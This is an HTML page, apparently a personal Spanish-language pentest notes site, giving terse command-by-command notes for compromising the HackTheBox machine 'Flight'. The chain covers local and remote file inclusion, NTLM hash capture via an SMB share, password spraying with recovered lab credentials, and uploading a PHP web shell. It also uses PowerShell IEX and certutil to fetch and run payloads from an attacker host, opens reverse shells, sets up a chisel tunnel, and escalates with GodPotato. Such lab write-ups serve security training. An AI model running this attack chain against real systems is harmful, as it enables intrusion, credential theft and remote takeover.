@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://flight.htb &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.flight.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt &lt;span class=&quot;nt&quot;&gt;-mc&lt;/span&gt; all &lt;span class=&quot;nt&quot;&gt;-ac&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> http://flight.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.flight.htb"</span> <span class="nt">-w</span> /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-mc</span> all <span class="nt">-ac</span>
+</code></pre></div></div>
+
+<h1 id="lfi---local-file-inclusion--rfi---remote-file-inclusion">LFI - Local File inclusion &amp; RFI - Remote File Inclusion</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://school.flight.htb/index.php?view=C:/xampp/apache/logs/access.log
+</code></pre></div></div>
+
+<p>NO ES LOG POISONING</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://school.flight.htb/index.php?view=C:/xampp/apache/logs/access.log&amp;cmd=ping+10.10.14.4
+</code></pre></div></div>
+
+<p>Tratamos de cargar una php desde un servidor html pero no lo interpreta.</p>
+
+<p>Podemos likear el hash cargando desde smbserver:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://school.flight.htb/index.php?view=//10.10.14.4/share
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver share ./share <span class="nt">-smb2support</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc_apache \ S@Ss!K@*t13
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound-python  <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">-d</span> flight.htb <span class="nt">-ns</span> 10.10.11.187 <span class="nt">-dc</span> G0.flight.htb <span class="nt">-c</span> all <span class="nt">--zip</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.11.187 <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>recurse
+prompt
+mget *
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.11.187/Users <span class="nt">-U</span> svc_apache%<span class="s1">'S@Ss!K@*t13'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb 10.10.11.187 <span class="nt">-u</span> validUsers.txt  <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>  <span class="nt">-d</span> flight.htb <span class="nt">--continue-on-success</span> <span class="nt">--no-bruteforce</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>S.Moon \ S@Ss!K@*t13
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.11.187 <span class="nt">-u</span> <span class="s1">'S.Moon'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>smb 10.10.11.187 <span class="nt">-u</span> <span class="s2">"S.Moon"</span>  <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>  <span class="nt">-d</span> flight.htb <span class="nt">--shares</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //flight.htb/shared <span class="nt">-U</span> S.Moon <span class="s1">'S@Ss!K@*t13'</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prompt
+mput *
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c.bum \ Tikkycoll_431012284
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s2">"C.Bum"</span>  <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span>  <span class="nt">-d</span> flight.htb <span class="nt">--shares</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //flight.htb/Web <span class="nt">-U</span> <span class="s2">"C.Bum"</span> <span class="s1">'Tikkycoll_431012284'</span>
+
+mput shell.php
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://school.flight.htb/shell.php?cmd=whoami
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://school.flight.htb/shell.php?cmd=powershell%20-c%20%22IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.7/Invoke-PowerShellTcp.ps1%27)%22
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.7/runas.exe runas.exe 
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc -lvnp 5555
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./runas.exe c.bum Tikkycoll_431012284 powershell.exe <span class="nt">-r</span> 10.10.14.7:5555
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel server --port 7777 --reverse
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\c</span>hisel client 10.10.14.7:7777 R:8000:127.0.0.1:8000
+</code></pre></div></div>
+
+<p>Dejamos <code class="language-plaintext highlighter-rouge">webshell.aspx</code> en <code class="language-plaintext highlighter-rouge">C:\inetpub\development</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="nt">-c</span> <span class="s2">"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1')"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 6666
+</code></pre></div></div>
+<h1 id="seimpersonateprivilege"><strong>SeImpersonatePrivilege</strong></h1>
+
+<p>El usuario <code class="language-plaintext highlighter-rouge">iis apppool\defaultapppool</code> suele correr bajo <code class="language-plaintext highlighter-rouge">NT Authority System</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\G</span>odPotato-NET4.exe <span class="nt">-cmd</span> <span class="s2">"cmd /c whoami"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\G</span>odPotato-NET4.exe <span class="nt">-cmd</span> <span class="s2">"cmd /c type C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span>
+</code></pre></div></div>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
